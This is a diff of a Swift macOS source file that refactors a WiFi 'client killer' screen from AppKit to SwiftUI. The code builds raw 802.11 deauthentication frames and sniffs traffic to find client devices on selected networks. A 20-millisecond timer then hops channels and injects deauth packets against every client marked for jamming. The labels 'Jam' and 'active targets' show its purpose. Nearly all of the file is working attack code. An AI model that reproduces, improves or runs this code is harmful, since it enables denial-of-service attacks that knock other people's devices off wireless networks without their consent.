@@ -1,18 +1,7 @@
-
-
-
 import Foundation
 import AppKit
-
-
-//#define DEAUTH_REQ \
-//	"\xC0\x00"                  /* Type: Management Subtype: Deauthentication  */ \
-//	"\x3C\x00"                  /* Duration */ \
-//	"\xCC\xCC\xCC\xCC\xCC\xCC"  /* Destination MAC Address */ \
-//	"\xBB\xBB\xBB\xBB\xBB\xBB"  /* Transmitter MAC Address */ \
-//	"\xBB\xBB\xBB\xBB\xBB\xBB"  /* BSSID */\
-//	"\x00\x00"                  /* Sequence Number */\
-//	"\x01\x00"                  /* Unspecified reason */
+import SwiftUI
+import Combine
 
 let DEAUTH_REQ: [UInt8] = [
 	0xC0,0x00,                        /* Type: Management Subtype: Deauthentication  */
@@ -23,373 +12,272 @@ let DEAUTH_REQ: [UInt8] = [
 	0x00,0x00,                        /* Sequence Number */
 	0x01,0x00]                        /* Unspecified reason */
 
+final class JWClientKiller: NSObject, ObservableObject, ANWiFiSnifferDelegate {
+    weak var navigation: AppNavigation?
+    @Published var clients: [JWClient] = []
+    @Published var discoverNewClients = true
+    @Published var headerStatsText = "Jam session primed"
 
-//let DEAUTH_REQ =
-//"\\xC0\\x00\\x3A\\x01\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\x00\\x00\\x07\\x00"
+    var channels: [CWChannel] = []
+    var networksForChannel: [CWChannel: [JWScanResult]] = [:]
+    var channelIndex = 0
+    var sniffer: ANWiFiSniffer?
+    var jamTimer: Timer?
 
+    private var sortAscending = true
+    private var sortOrder = ""
 
-class JWClientKiller: NSView, ANWiFiSnifferDelegate, NSTableViewDelegate, NSTableViewDataSource {
-	var clients: [JWClient] = []
-	var channels: [CWChannel] = []
-	var networksForChannel: [CWChannel : [JWScanResult]] = [:]
-	var channelIndex = 0
-	var sniffer: ANWiFiSniffer?
-	var jamTimer: Timer?
-	var infoTable: NSTableView?
-	var infoScrollView: NSScrollView?
-	var backButton: NSButton?
-	var doneButton: NSButton?
-	var newClientsCheck: NSButton?
+    init(navigation: AppNavigation?, sniffer theSniffer: ANWiFiSniffer?, networks: [JWScanResult]?, clients theClients: [JWClient]?) {
+        self.navigation = navigation
+        clients = theClients ?? []
+        sniffer = theSniffer
+        super.init()
+        sniffer?.delegate = self
+        sniffer?.start()
 
-	var sortAscending = true
-	var sortOrder = ""
-	
+        var discoveredChannels: [CWChannel] = []
+        for net in networks ?? [] {
+            if let ch = net.wlanChannel,
+               !discoveredChannels.contains(where: { $0.channelNumber == ch.channelNumber && $0.channelBand == ch.channelBand }) {
+                discoveredChannels.append(ch)
+            }
+        }
+        channels = discoveredChannels
+        channelIndex = -1
+        var grouped: [CWChannel: [JWScanResult]] = [:]
+        for channel in channels {
+            grouped[channel] = (networks ?? []).filter {
+                $0.channelNumber == channel.channelNumber && $0.channelBandRaw == channel.channelBand.rawValue
+            }
+        }
+        networksForChannel = grouped
+        updateHeaderStats()
+        if theSniffer != nil {
+            jamTimer = Timer.scheduledTimer(timeInterval: 0.02, target: self, selector: #selector(performNextRound), userInfo: nil, repeats: true)
+            performNextRound()
+        }
+    }
 
-	init(frame: NSRect, sniffer theSniffer: ANWiFiSniffer?, networks: [JWScanResult]?, clients theClients: [JWClient]?) {
-		super.init(frame: frame)
-		clients = theClients ?? []
-		sniffer = theSniffer
-		sniffer?.delegate = self
-		sniffer?.start()
-		
-		var mChannels: [CWChannel] = []
-		for net in networks ?? [] {
-			if let ch = net.wlanChannel,
-			   !mChannels.contains(where: { $0.channelNumber == ch.channelNumber && $0.channelBand == ch.channelBand }) {
-				mChannels.append(ch)
-			}
-		}
+    func backButton(_ sender: Any?) {
+        jamTimer?.invalidate()
+        jamTimer = nil
+        sniffer?.delegate = nil
+        navigation?.pop()
+    }
 
-		channels = mChannels
-		channelIndex = -1
+    func doneButton(_ sender: Any?) {
+        jamTimer?.invalidate()
+        jamTimer = nil
+        sniffer?.stop()
+        sniffer?.delegate = nil
+        sniffer = nil
+        navigation?.popToRoot()
+    }
 
-		var mNetworksPerChannel: [CWChannel : [JWScanResult]] = [:]
-		for channel in channels {
-			let mNetworks = (networks ?? []).filter {
-				$0.channelNumber == channel.channelNumber && $0.channelBandRaw == channel.channelBand.rawValue
-			}
-			mNetworksPerChannel[channel] = mNetworks
-		}
-		networksForChannel = mNetworksPerChannel
-		
-		jamTimer = Timer.scheduledTimer(timeInterval: 0.02, target: self, selector: #selector(performNextRound), userInfo: nil, repeats: true)
-		performNextRound()
-		
-		configureUI()
-	}
-	
-	required init?(coder decoder: NSCoder) {
-		super.init(coder: decoder)
-		//fatalError("init(coder:) has not been implemented")
-	}
-	
-	func configureUI() {
-		let frame = bounds
-		infoScrollView = NSScrollView(frame: NSRect(x: 10, y: 52, width: frame.size.width - 20, height: frame.size.height - 62))
-		infoTable = NSTableView(frame: infoScrollView!.contentView.bounds)
-		doneButton = NSButton(frame: NSRect(x: frame.size.width - 110, y: 10, width: 100, height: 24))
-		backButton = NSButton(frame: NSRect(x: frame.size.width - 210, y: 10, width: 100, height: 24))
-		newClientsCheck = NSButton(frame: NSRect(x: 10, y: 10, width: 200, height: 24))
-		
-		newClientsCheck?.setButtonType(.switch)
-		newClientsCheck?.bezelStyle = .rounded
-		newClientsCheck?.title = "Actively scan for clients"
-		newClientsCheck?.state = .init(1)
-		
-		backButton?.bezelStyle = .rounded
-		backButton?.title = "Back"
-		backButton?.font = .systemFont(ofSize: 13)
-		backButton?.target = self
-		backButton?.action = #selector(backButton(_:))
-		
-		doneButton?.bezelStyle = .rounded
-		doneButton?.title = "Done"
-		doneButton?.font = .systemFont(ofSize: 13)
-		doneButton?.target = self
-		doneButton?.action = #selector(doneButton(_:))
-		
-		let enabledColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("enabled"))
-		enabledColumn.headerCell.stringValue = "Jam"
-		enabledColumn.width = 30
-		enabledColumn.isEditable = true
-		enabledColumn.sortDescriptorPrototype = NSSortDescriptor(key: enabledColumn.identifier.rawValue, ascending: true)
-		infoTable?.addTableColumn(enabledColumn)
-		
-		let deviceColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("device"))
-		deviceColumn.headerCell.stringValue = "Device"
-		deviceColumn.width = 120
-		deviceColumn.isEditable = false
-		deviceColumn.sortDescriptorPrototype = NSSortDescriptor(key: deviceColumn.identifier.rawValue, ascending: true)
-		infoTable?.addTableColumn(deviceColumn)
-		
-		let deauthsColumn = NSTableColumn(identifier: NSUserInterfaceItemIdentifier("count"))
-		deauthsColumn.headerCell.stringValue = "Deauths"
-		deauthsColumn.width = 120
-		deauthsColumn.isEditable = false
-		deauthsColumn.sortDescriptorPrototype = NSSortDescriptor(key: deauthsColumn.identifier.rawValue, ascending: true)
-		infoTable?.addTableColumn(deauthsColumn)
-		
-		infoScrollView?.documentView = infoTable
-		infoScrollView?.borderType = .bezelBorder
-		infoScrollView?.hasVerticalScroller = true
-		infoScrollView?.hasHorizontalScroller = true
-		infoScrollView?.autohidesScrollers = false
-		
-		infoTable?.dataSource = self
-		infoTable?.delegate = self
-		infoTable?.allowsMultipleSelection = true
-		
-		if let _ = infoScrollView { addSubview(infoScrollView!) }
-		if let _ = backButton { addSubview(backButton!) }
-		if let _ = doneButton { addSubview(doneButton!) }
-		if let _ = newClientsCheck { addSubview(newClientsCheck!) }
-		
-		autoresizesSubviews = true
-		autoresizingMask = [.width, .height]
-		infoScrollView?.autoresizingMask = [.width, .height]
-		doneButton?.autoresizingMask = .minXMargin
-		backButton?.autoresizingMask = .minXMargin
-	}
+    func toggleClient(_ client: JWClient, enabled: Bool) {
+        client.enabled = enabled
+        updateHeaderStats()
+        objectWillChange.send()
+    }
 
-	override func resizeSubviews(withOldSize oldSize: NSSize) {
-		super.resizeSubviews(withOldSize: oldSize)
-		let insets = (window?.contentView as NSView?)?.safeAreaInsets ?? NSEdgeInsetsZero
-		let top = insets.top
-		let bottom = insets.bottom
-		let toolbarBottom = top + 42
-		let contentTop = toolbarBottom + 10
+    func sortClients(by key: String) {
+        if sortOrder == key {
+            sortAscending.toggle()
+        } else {
+            sortOrder = key
+            sortAscending = true
+        }
 
-		newClientsCheck?.frame = NSRect(x: 10, y: top + 10, width: 200, height: 24)
-		backButton?.frame = NSRect(x: bounds.width - 210, y: top + 10, width: 100, height: 24)
-		doneButton?.frame = NSRect(x: bounds.width - 110, y: top + 10, width: 100, height: 24)
-		infoScrollView?.frame = NSRect(x: 10, y: contentTop, width: bounds.width - 20, height: bounds.height - contentTop - bottom)
-	}
-	
-	// MARK: - Events -
-	
-	@objc func backButton(_ sender: Any?) {
-		jamTimer?.invalidate()
-		jamTimer = nil
-		sniffer?.delegate = nil
-		var networks: [JWScanResult] = []
-		for networkArr in networksForChannel.values {
-			networkArr.forEach { networks.append($0) }
-		}
-		
-		let gatherer = JWTrafficGatherer(frame: bounds, sniffer: sniffer, networks: networks)
-		(NSApp.delegate as? JWAppDelegate)?.push(gatherer, direction: .backward)
-	}
-	
-	@objc func doneButton(_ sender: Any?) {
-		jamTimer?.invalidate()
-		jamTimer = nil
-		sniffer?.stop()
-		sniffer?.delegate = nil
-		sniffer = nil
-		(NSApp.delegate as? JWAppDelegate)?.showNetworkList()
-	}
-	
-	// MARK: - Table View -
-	func numberOfRows(in tableView: NSTableView) -> Int {
-		return clients.count
-	}
-	
-	func tableView(_ tableView: NSTableView, objectValueFor tableColumn: NSTableColumn?, row: Int) -> Any? {
-		let client = clients[row]
-		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("device")) {
-			return MACToString(client.macAddress)
-		} else if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("count")) {
-			return NSNumber(value: client.deauthsSent)
-		} else if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
-			return NSNumber(value: client.enabled)
-		}
-		return nil
-	}
-	
-	func tableView(_ tableView: NSTableView, dataCellFor tableColumn: NSTableColumn?, row: Int) -> NSCell? {
-		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
-			let cell = NSButtonCell()
-			cell.setButtonType(.switch)
-			cell.title = ""
-			return cell
-		}
-		return nil
-	}
-	
-	func tableView(_ tableView: NSTableView, setObjectValue object: Any?, for tableColumn: NSTableColumn?, row: Int) {
-		let client = clients[row]
-		if (tableColumn?.identifier == NSUserInterfaceItemIdentifier("enabled")) {
-			client.enabled = (object as? NSNumber)?.boolValue ?? false
-		}
-	}
-	
-	func tableView(_ tableView: NSTableView, sortDescriptorsDidChange oldDescriptors: [NSSortDescriptor]) {
-		
-		guard let sortDescriptor = tableView.sortDescriptors.first else {
-		   return
-		 }
-		
-		sortAscending = sortDescriptor.ascending
-		sortOrder = sortDescriptor.key!
-		sortNetworks()
-		infoTable?.reloadData()
-	}
-	
-	@inline(__always) func sortNetworks() {
-		if sortOrder == "" { return }
-		
-		let order: ComparisonResult = sortAscending ? .orderedAscending : .orderedDescending
+        let order: ComparisonResult = sortAscending ? .orderedAscending : .orderedDescending
+        switch key {
+        case "enabled": clients.sort { $0.enabled.description.localizedStandardCompare($1.enabled.description) == order }
+        case "device": clients.sort { MACToString($0.macAddress).localizedStandardCompare(MACToString($1.macAddress)) == order }
+        case "count": clients.sort { String($0.deauthsSent).localizedStandardCompare(String($1.deauthsSent)) == order }
+        default: break
+        }
+    }
 
-		switch sortOrder {
-			case "enabled": clients.sort { $0.enabled.description.localizedStandardCompare($1.enabled.description) == order}; break
-			case "device": clients.sort { MACToString($0.macAddress).localizedStandardCompare(MACToString($1.macAddress)) == order}; break
-			case "count": clients.sort { String($0.packetCount).localizedStandardCompare(String($1.packetCount)) == order}; break
-			default: break
-		}
-	}
-	
-	// MARK: - Deauthing -
-	
-	@objc func performNextRound() {
-		channelIndex += 1
-		if channelIndex >= channels.count {
-			channelIndex = 0
-		}
-		let channel : CWChannel? = channels[channelIndex]
-		sniffer?.setChannel(channel)
-		// deauth all clients on all networks on this channel
-		var networks: [JWScanResult]? = nil
-		if let channel = channel {
-			networks = networksForChannel[channel]
-		}
-		for client in clients {
-			if !client.enabled {
-				continue
-			}
-			for network in networks ?? [] {
-				var bssid = [UInt8](repeating: 0, count: 6)
-				copyMAC(network.bssid, &bssid)
-				let packet = deauthPacket(forBSSID: bssid, client: client.macAddress)
-				sniffer?.write(packet)
-				client.deauthsSent += 1
-			}
-		}
-//		sortNetworks()
-		infoTable?.reloadData()
-	}
-	
-	func deauthPacket(forBSSID bssid: UnsafePointer<UInt8>?, client: UnsafePointer<UInt8>?) -> AN80211Packet? {
-		var deauth = [CChar](repeating: 0, count: 26)
+    @objc func performNextRound() {
+        guard !channels.isEmpty else {
+            updateHeaderStats()
+            return
+        }
 
-		memcpy(&deauth[0], DEAUTH_REQ, 26)
-		memcpy(&deauth[4], client, 6)
-		memcpy(&deauth[10], bssid, 6)
-		memcpy(&deauth[16], bssid, 6)
-		
-		let packet = AN80211Packet(data: Data(bytes: deauth, count: 26))
-		return packet
-	}
-	
-	func includesBSSID(_ bssid: UnsafePointer<UInt8>?) -> Bool {
-		for key in networksForChannel {
-			for network in key.value {
-				if (MACToString(bssid) == network.bssid) {
-					return true
-				}
-			}
-		}
-		return false
-	}
-	
-	// MARK: - WiFi Sniffer -
-	func wifiSniffer(_ sniffer: ANWiFiSniffer?, gotPacket packet: AN80211Packet?) {
-		if (newClientsCheck?.state == nil) {
-			return
-		}
-		var hasClient = false
-		var client = [CUnsignedChar](repeating: 0, count: 6)
-		var bssid = [CUnsignedChar](repeating: 0, count: 6)
-		if packet?.dataFCS() != packet?.calculateFCS() {
-			return
-		}
-		if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 1 {
-			//withUnsafePointer(to: packet?.macHeader().pointee.mac1) { memcpy(&bssid, $0, 6) }
-				//bssid = withUnsafePointer(to: packet?.macHeader().pointee.mac1) {
-				//	$0.withMemoryRebound(to: CUnsignedChar.self, capacity: 6) {
-				//		Array(UnsafeBufferPointer(start: $0, count: 6))
-				//	}
-				//}
-			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) {
-				Array($0.bindMemory(to: CUnsignedChar.self))
-			}
-			
-			if !includesBSSID(bssid) { return }
-			client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
-				Array($0.bindMemory(to: CUnsignedChar.self))
-			}
-			hasClient = true
-		} else if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
-			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac3) {
-				Array($0.bindMemory(to: CUnsignedChar.self))
-			}
-			if !includesBSSID(bssid) {
-				return
-			}
-			if memcmp(withUnsafeBytes(of: packet?.macHeader().pointee.mac2){$0.baseAddress!}, withUnsafeBytes(of: packet?.macHeader().pointee.mac3){$0.baseAddress!}, 6) != 0 {
-				client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
-					Array($0.bindMemory(to: CUnsignedChar.self))
-				}
-				hasClient = true
-			}
-		} else if packet?.macHeader().pointee.frame_control.from_ds == 1 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
-			bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) {
-				Array($0.bindMemory(to: CUnsignedChar.self))
-			}
-			if !includesBSSID(bssid) {
-				return
-			}
-			client = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) {
-				Array($0.bindMemory(to: CUnsignedChar.self))
-			}
-			hasClient = true
-		}
-		if client[0] == 0x33 && client[1] == 0x33 {
-			hasClient = false
-		}
-		if client[0] == 0x01 && client[1] == 0x00 {
-			hasClient = false
-		}
-		if client[0] == 0xff && client[1] == 0xff {
-			hasClient = false
-		}
-		if client[0] == 0x03 && client[5] == 0x01 {
-			hasClient = false
-		}
-		if hasClient {
-			let clientObj = JWClient(mac: client, bssid: bssid)
-			var containsClient = false
-			for aClient in clients {
-				if memcmp(aClient.macAddress, clientObj.macAddress, 6) == 0 {
-					containsClient = true
-					break
-				}
-			}
-			if !containsClient {
-				clients.append(clientObj)
-//				sortNetworks()
-				infoTable?.reloadData()
-			}
-		}
-	}
-	
-	func wifiSniffer(_ sniffer: ANWiFiSniffer?, failedWithError error: Error?) {
-		if let error = error {
-			print("Got error: \(error)")
-		}
-	}
-	
-	func wifiSnifferFailed(toOpenInterface sniffer: ANWiFiSniffer?) {
-		print("Couldn't open interface")
-	}
+        channelIndex += 1
+        if channelIndex >= channels.count {
+            channelIndex = 0
+        }
 
+        let channel = channels[channelIndex]
+        sniffer?.setChannel(channel)
+        let currentNetworks = networksForChannel[channel] ?? []
+
+        for client in clients where client.enabled {
+            for network in currentNetworks {
+                var bssid = [UInt8](repeating: 0, count: 6)
+                bssid.withUnsafeMutableBufferPointer { buf in
+                    guard let base = buf.baseAddress, copyMAC(network.bssid, base), let packet = deauthPacket(forBSSID: base, client: client.macAddress) else { return }
+                    sniffer?.write(packet)
+                    client.deauthsSent += 1
+                }
+            }
+        }
+
+        updateHeaderStats()
+        objectWillChange.send()
+    }
+
+    func deauthPacket(forBSSID bssid: UnsafePointer<UInt8>?, client: UnsafePointer<UInt8>?) -> AN80211Packet? {
+        var deauth = [CChar](repeating: 0, count: 26)
+        memcpy(&deauth[0], DEAUTH_REQ, 26)
+        memcpy(&deauth[4], client, 6)
+        memcpy(&deauth[10], bssid, 6)
+        memcpy(&deauth[16], bssid, 6)
+        return AN80211Packet(data: Data(bytes: deauth, count: 26))
+    }
+
+    func includesBSSID(_ bssid: UnsafePointer<UInt8>?) -> Bool {
+        networksForChannel.values.flatMap { $0 }.containsBSSID(bssid)
+    }
+
+    func wifiSniffer(_ sniffer: ANWiFiSniffer?, gotPacket packet: AN80211Packet?) {
+        guard discoverNewClients else { return }
+        var hasClient = false
+        var client = [CUnsignedChar](repeating: 0, count: 6)
+        var bssid = [CUnsignedChar](repeating: 0, count: 6)
+        if packet?.dataFCS() != packet?.calculateFCS() { return }
+
+        if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 1 {
+            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+            if !includesBSSID(bssid) { return }
+            client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+            hasClient = true
+        } else if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
+            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac3) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+            if !includesBSSID(bssid) { return }
+            if memcmp(withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { $0.baseAddress! }, withUnsafeBytes(of: packet?.macHeader().pointee.mac3) { $0.baseAddress! }, 6) != 0 {
+                client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+                hasClient = true
+            }
+        } else if packet?.macHeader().pointee.frame_control.from_ds == 1 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
+            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+            if !includesBSSID(bssid) { return }
+            client = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) { Array($0.bindMemory(to: CUnsignedChar.self)) }
+            hasClient = true
+        }
+
+        if client[0] == 0x33 && client[1] == 0x33 { hasClient = false }
+        if client[0] == 0x01 && client[1] == 0x00 { hasClient = false }
+        if client[0] == 0xff && client[1] == 0xff { hasClient = false }
+        if client[0] == 0x03 && client[5] == 0x01 { hasClient = false }
+
+        if hasClient {
+            DispatchQueue.main.async {
+                let clientObject = JWClient(mac: client, bssid: bssid)
+                let containsClient = self.clients.contains { $0.macAddress.prefix(6).elementsEqual(clientObject.macAddress.prefix(6)) }
+                if !containsClient {
+                    self.clients.append(clientObject)
+                    self.updateHeaderStats()
+                }
+            }
+        }
+    }
+
+    func wifiSniffer(_ sniffer: ANWiFiSniffer?, failedWithError error: Error?) {
+        if let error = error {
+            print("Got error: \(error)")
+        }
+    }
+
+    func wifiSnifferFailed(toOpenInterface sniffer: ANWiFiSniffer?) {
+        print("Couldn't open interface")
+    }
+
+    private func updateHeaderStats() {
+        let enabledCount = clients.filter(\.enabled).count
+        headerStatsText = "\(enabledCount) active targets • \(clients.count) total clients"
+    }
 }
+
+struct JWClientKillerScreen: View {
+    @ObservedObject var controller: JWClientKiller
+
+    var body: some View {
+        VStack(alignment: .leading, spacing: 16) {
+            HStack {
+                Text("Jam")
+                    .font(.title2.weight(.semibold))
+                Spacer()
+                Text(controller.headerStatsText)
+                    .font(.caption)
+                    .foregroundStyle(.secondary)
+            }
+
+            VStack(spacing: 0) {
+                headerRow
+                Divider()
+                List {
+                    ForEach(controller.clients, id: \.self) { client in
+                        HStack(spacing: 12) {
+                            Toggle("", isOn: Binding(
+                                get: { client.enabled },
+                                set: { controller.toggleClient(client, enabled: $0) }
+                            ))
+                            .labelsHidden()
+                            .frame(width: 30, alignment: .leading)
+                            Text(MACToString(client.macAddress))
+                                .font(.system(.body, design: .monospaced))
+                                .frame(width: 180, alignment: .leading)
+                            Text("\(client.deauthsSent)")
+                                .frame(width: 100, alignment: .trailing)
+                        }
+                        .font(.system(size: 13))
+                    }
+                }
+                .listStyle(.plain)
+            }
+
+            HStack {
+                Toggle("Actively scan for clients", isOn: $controller.discoverNewClients)
+                Spacer()
+                Button("Back") { controller.backButton(nil) }
+                Button("Done") { controller.doneButton(nil) }
+            }
+        }
+        .padding(20)
+        .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .topLeading)
+    }
+
+    private var headerRow: some View {
+        HStack(spacing: 12) {
+            headerButton("Jam", key: "enabled")
+                .frame(width: 30, alignment: .leading)
+            headerButton("Device", key: "device")
+                .frame(width: 180, alignment: .leading)
+            headerButton("Deauths", key: "count")
+                .frame(width: 100, alignment: .trailing)
+        }
+        .font(.caption.weight(.semibold))
+        .foregroundStyle(.secondary)
+    }
+
+    private func headerButton(_ title: String, key: String) -> some View {
+        Button(title) {
+            controller.sortClients(by: key)
+        }
+        .buttonStyle(.plain)
+    }
+}
+
+#if canImport(SwiftUI)
+private struct JWClientKillerPreviewWrapper: View {
+    @StateObject private var controller = JWClientKiller(navigation: nil, sniffer: nil, networks: JWPreviewFactory.sampleNetworks, clients: JWPreviewFactory.sampleClients)
+    var body: some View { JWClientKillerScreen(controller: controller) }
+}
+struct JWClientKiller_Previews: PreviewProvider {
+    static var previews: some View {
+        JWClientKillerPreviewWrapper()
+            .frame(width: 1100, height: 720)
+    }
+}
+#endif
